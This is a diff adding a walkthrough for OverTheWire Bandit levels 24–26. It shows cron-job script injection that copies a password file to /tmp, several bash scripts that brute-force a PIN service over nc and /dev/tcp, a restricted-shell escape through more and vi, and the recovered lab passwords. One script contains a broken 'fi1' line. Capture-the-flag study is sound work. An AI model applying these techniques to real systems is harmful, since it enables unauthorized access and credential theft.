@@ -560,3 +560,222 @@ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 ```
 
 and the password we get is: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+## Bandit 24
+
+> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.    
+NOTE: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+Let's check the cronjob configuration in `/etc/cron.d/`:
+
+```bash
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+```
+
+![script](pics/2025-06-28-11-15-26.png)
+
+The code does the following:
+1. Enters the directory `/var/spool/$myname/foo`, where $myname is the username of the user running the script (bandit24).
+2. Loops over all files and directories, including hidden files (because of .*).
+3. Skips special entries:
+   - . → current directory
+   - .. → parent directory
+4. If the owner of the file is bandit23, it executes the file with for maximum 60 seconds. If the file doesn’t exit within 60 seconds, it sends signal 9 (SIGKILL) to force kill it.
+5. It deletes the file unconditionally, after running it or skipping it.
+
+This means that we can create a file in the directory `/var/spool/bandit24/foo` and it will be executed by the script with the permissions of bandit24. We can use this to read the password for the next level, which is stored in `/etc/bandit_pass/bandit24`.
+
+Let's create a script called `kbkScript` in the directory `/var/spool/bandit24/foo` with the following content:
+
+```bash
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/kbkScriptOutput.txt
+```
+
+Make sure to give it execute permissions:
+
+```bash
+chmod +x /var/spool/bandit24/foo/kbkScript
+```
+
+Now we wait for the cron job to run, and then we can check the output file:
+
+```bash
+cat /tmp/kbkScriptOutput.txt
+```
+
+![password](pics/2025-06-28-11-45-05.png)
+
+Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+## Bandit 25
+
+> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. You do not need to create new connections each time
+
+First, let's check the service on port 30002:
+
+```bash
+nc -N localhost 30002
+```
+
+It asks the password for user bandit24 and the secret pincode on a single line, separated by a space.
+
+To brute-force the 4-digit pincode, we can use a simple bash script that iterates over all possible combinations from 0000 to 9999. For each combination, it sends the password for bandit24 and the current combination to the service on port 30002. If the response does not contain the word "Wrong", it means we have found the correct combination.
+
+If the server doesn't allow persistent connections, we have to connect to the service for each combination:
+
+```bash
+#!/bin/bash
+for n in $(seq -f "%04g" 0 9999)
+do
+  password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $n"
+  echo -ne "Trying: $password\r"
+  reply=$(echo "$password" | nc -N localhost 30002)
+  if [[ "$reply" != *Wrong* ]]; then
+    echo -e "\n$reply"
+    break
+  fi 
+done
+```
+
+Or
+
+```bash
+#!/bin/bash
+password_base="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
+
+for ((n=0; n<=9999; n++)); do
+    printf -v pin "%04d" "$n"
+    attempt="$password_base $pin"
+
+    echo -ne "Trying: $attempt\r"
+    reply=$(echo "$attempt" | nc -N localhost 30002)
+
+    if [[ "$reply" != *Wrong* ]]; then
+        echo -e "\nSuccess: $reply"
+        break
+    fi
+done
+```
+
+If the server allows persistent connections:
+
+```bash
+#!/bin/bash
+
+password_base="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
+
+# Prepare a list of all attempts
+# We'll feed them into nc's stdin
+for n in $(seq -f "%04g" 0 9999); do
+    echo "$password_base $n"
+done | nc localhost 30002 | while read -r reply; do
+    if [[ "$reply" != *Wrong* ]]; then
+        echo "$reply"
+    fi
+done
+```
+
+Or:
+
+```bash
+#!/bin/bash
+
+password_base="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
+
+# Open a single connection to the server
+# Use process substitution so we can read and write
+exec 3<>/dev/tcp/localhost/30002
+
+# Check connection opened
+if [[ $? -ne 0 ]]; then
+    echo "Failed to connect to server"
+    exit 1
+fi
+
+for ((n=0; n<=9999; n++)); do
+    printf -v pin "%04d" "$n"
+    attempt="$password_base $pin"
+
+    echo -ne "Trying: $attempt\r"
+
+    # Send attempt into socket
+    echo "$attempt" >&3
+
+    # Read reply line from server
+    IFS= read -r reply <&3
+
+    if [[ "$reply" != *Wrong* && "$reply" != *"I am"* ]]; then
+        echo -e "\nSuccess: $attempt"
+        break
+    fi1
+done
+
+# Close socket
+exec 3<&-
+exec 3>&-
+```
+
+Now run the script:
+
+```bash
+/path/to/your/script.sh
+```
+
+The script will try all combinations and print the current combination being tried. When it finds the correct combination, it will print the response from the service.
+
+![Password](pics/2025-06-28-12-35-20.png)
+
+Password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+## Bandit 26
+
+> Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.  
+NOTE: if you’re a Windows user and typically use Powershell to ssh into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.
+
+If we check the files in the home directory of bandit25, we can see there is a key for ssh. We can probably use it to login to bandit26. So we exit bandit25, download the key using scp and then login to bandit26 using the key:
+
+```bash
+scp -P 2220 bandit25@bandit.labs.overthewire.org:/home/bandit25/bandit26.sshkey ./bandit26.sshkey
+ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
+```
+
+But as we connect, the session is closed immediately. This is probably because the shell for user bandit26 is not /bin/bash, but something else.
+
+To find out what shell is used for user bandit26, we can check the `/etc/passwd` file:
+
+```bash
+cat /etc/passwd | grep bandit26
+```
+
+It seems like bandit26 uses `/usr/bin/showtext` as its shell. Let's check the file:
+
+```bash
+cat /usr/bin/showtext
+```
+
+![showtext](pics/2025-06-28-16-02-36.png)
+
+The code executes the comand more on text.txt. So why does the session close immediately? What if the file content is too short to be displayed with more? In this case minimizing the terminal window would force more to page the content. Let's try it:
+
+![it worked](pics/2025-06-28-16-13-09.png)
+
+It worked! Now we need to find a way to exploit this.  
+Looking on google for "more" subcommands we find that we can use the `v` command to open the file in the default editor, which is usually `vi`. Now that we are in `vi` we can open a file using the `:e` command followed by the file path.
+
+```bash
+:e /etc/bandit_pass/bandit26
+```
+
+This will open the file with the password for bandit26. We can then read the password and exit `vi` using `:q`.
+
+Password: s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
+
+If we want a shell, we can use the `:shell` command to spawn a shell. But this will not work because the shell is not `/bin/bash`, but `/usr/bin/showtext`. So we can use the `:set` command in vi to change the shell:
+
+```bash
+:set shell=/bin/bash
+```
+
+Now we can spawn a shell using the `:shell` command, and get the password.
